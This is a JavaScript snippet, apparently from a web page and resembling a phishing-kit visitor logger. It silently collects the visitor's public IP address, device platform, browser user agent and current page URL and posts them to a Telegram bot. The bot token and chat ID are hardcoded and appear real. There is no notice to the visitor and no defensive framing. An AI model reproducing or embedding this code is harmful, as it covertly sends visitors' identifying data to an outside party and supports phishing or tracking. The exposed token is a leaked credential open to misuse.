        // Function to get client IP address
        function getClientIP() {
            var ipAddress = '';
            if (window.XMLHttpRequest) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://api.ipify.org?format=json', false);
                xhr.send();
                if (xhr.status === 200) {
                    ipAddress = JSON.parse(xhr.responseText).ip;
                }
            }
            return ipAddress || 'UNKNOWN';
        }

        // Telegram API endpoint
        var botID = "-1001874783762"; // Your Telegram bot ID
        var telegramURL = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage'; // Replace <YourBotToken> with your actual bot token

        // Determine device type
        var machine = navigator.platform || 'Other';
        // Determine browser type
        var navigatorName = navigator.userAgent || 'Other';

        // Get client IP
        var publicIP = getClientIP();

        // Telegram message construction
        var msg = "-----{===--{ Nevo Info }--===}-----" + "\n\n" +
            "Your IP: " + publicIP + "\n\n" +
            "Your APP & Device: " + machine + '/' + navigatorName + "\n\n" +
            "Your Location: " + window.location.href + "\n\n" +
            "-----{===--{ Nevo Info }--===}-----";

        var data = JSON.stringify({
            chat_id: botID,
            text: msg
        });

        var xhr = new XMLHttpRequest();
        xhr.open('POST', telegramURL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(data);
